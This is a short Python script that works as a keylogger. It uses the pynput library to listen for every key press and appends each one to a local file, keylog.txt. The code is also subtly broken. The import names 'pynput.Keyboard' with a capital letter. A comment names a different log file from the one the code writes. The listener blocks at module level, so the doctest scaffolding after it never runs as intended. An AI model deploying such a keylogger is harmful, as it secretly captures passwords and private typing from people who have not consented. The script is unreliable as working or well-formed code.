from pynput.Keyboard import Listener


def writeofile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    with open("keylog.txt","a") as f:
        f.write(keydata)
    #return none
    #def function() -> None
    #this function will record keystrokes in log.txt

with Listener(on_press = writeofile) as l:
    l.join()

def type_hint(key: str) -> str:
    import doctest
    doctest.testmod()
    return key


if __name__ == "__main__":
    import doctest
    doctest.testmod()
